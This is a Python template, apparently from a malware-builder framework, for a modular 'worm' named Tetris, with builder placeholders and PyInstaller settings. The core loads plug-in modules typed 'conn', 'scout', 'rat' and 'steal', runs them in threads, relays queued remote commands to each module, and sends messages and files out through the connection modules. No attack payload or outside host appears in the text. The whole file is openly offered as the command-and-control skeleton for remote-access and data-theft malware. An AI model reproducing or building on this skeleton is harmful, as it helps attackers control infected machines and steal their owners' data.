#!name##Tetris
#!itemType##worm
#!info##The worm template written in Python, designed without a specific purpose. It allows integration of any number of additional Python-based modules. Ideal for building custom payloads and flexible worm structures in Python.
#!lang##python
#!Wprocess##BasicPy
#!wormCompiler##PyInstaller
#!itemTags##LW
#!typeAccept##PySM##PyExM##PySh


from typing import Union
from time import sleep
import queue
import threading

class Tetris:
    def __init__(self):
        self.name = "{{_WORM_NAME}}"
        self.__modules = {{pyTOOL.makeModulesDict(_PY_MODULES)}}
        self._modules = {"conn" : [], "scout" : [], "rat" : [], "steal" : []}
        self._no_type_modules = []
        self.TH_mods = []
        self.TH_execute_data = None
        self._flag_working = False
        self._input_cmd = queue.Queue()
    
    @property
    def FLAG_working(self) -> bool:
        return self._flag_working
    
    @property
    def connMods(self) -> list:
        return self.getModules("conn")
    
    @property
    def allMods(self) -> list:
        mods = []
        for mod_list in self._modules.values():
            mods.extend(mod_list)
        mods.extend(self._no_type_modules)
        return mods
    
    @property
    def is_conn(self) -> bool:
        return self._is_conn()
    
    def getModules(self, mod_type: Union[str, None]) -> list:
        if not mod_type:
            return self._no_type_modules
        mods = self._modules.get(mod_type)
        if not mods:
            return []
        else:
            return mods
    

    def _is_conn(self) -> bool:
        for mod in self.connMods:
            if mod.is_conn:
                return True
        return False
    
    def _load_modules(self) -> None:
        for mod in self.__modules.values():
            try:
                exmod = mod(self)
            except Exception as e:
                print("ERROR load mod: ", e)
                continue
            if mod.MTYPES in self._modules.keys():
                self._modules[mod.MTYPES].append(exmod)
            else:
                self._no_type_modules.append(exmod)

    def _run_module_as_th(self, mod: object) -> None:
        try:
            mod_th = threading.Thread(target=mod.start, daemon=True)
            mod_th.start()
            self.TH_mods.append(mod_th)
        except Exception as e:
            print("ERROR RUN MOD: ", e)
            pass
    
    def _run_module_vanila(self, mod: object) -> None:
        try:
            mod.start()
        except Exception as e:
            print("ERROR Start mod: ", e)
            pass

    def _run_modules(self) -> None:
        for mod in self.allMods:
            if hasattr(mod, "STAND_TH"):
                if mod.STAND_TH:
                    self._run_module_vanila(mod)
                else:
                    self._run_module_as_th(mod)
            else:
                self._run_module_as_th(mod)
    
    def processData(self, data: Union[str, dict, list]) -> None:
        if isinstance(data, str):
            print("RAW_CMD: ", data)
            self._input_cmd.put(data)
        else:
            print("ERROR Wrong data")
    
    def _executeData(self) -> None:
        while self._flag_working:
            data = self._input_cmd.get()
            self.exeCmd(data)

    def executeData(self) -> None:
        if not self.TH_execute_data:
            self.TH_execute_data = threading.Thread(target=self._executeData, daemon=True)
            self.TH_execute_data.start()
    
    def help(self) -> None:
        h = f"\n----------- {self.name} Help: ------------------\n"
        h += "wclose - Close Worm.\n"
        for mod in self.allMods:
            try:
                h += mod.help()
            except:
                pass
        print(h)
        self.send_msg(h)

    
    # def _exeSysCmd(self, command: str) -> None:
    #     cmd = command.split(" ")
    #     match cmd[0]:
    #         case "CLOSE":
    #             self._flag_working = False
        
    def exeCmd(self, command: str) -> None:
        cmd = command.split(" ")
        match cmd[0]:
            case "wclose":
                self._flag_working = False
            case "help":
                self.help()
        for mod in self.allMods:
            try:
                mod.exeCmd(command)
            except:
                pass
    
    def send_msg(self, msg: str, *args, **kwargs) -> None:
        for mod in self.connMods:
            try:
                mod.send_msg(msg, *args, **kwargs)
            except:
                pass

    def send_file(self, fpath: str, *args, **kwargs) -> None:
        for mod in self.connMods:
            try:
                mod.send_file(fpath, *args, **kwargs)
            except:
                pass

    def working(self) -> None:
        self.executeData()
        while self.FLAG_working:
            sleep(1)
            
            
    
    def Run(self) -> None:
        self._flag_working = True
        print("Tetris Start")
        self._load_modules()
        self._run_modules()
        self.working()
        # input("Press key")



if __name__ == "__main__":
    tt = Tetris()
    tt.Run()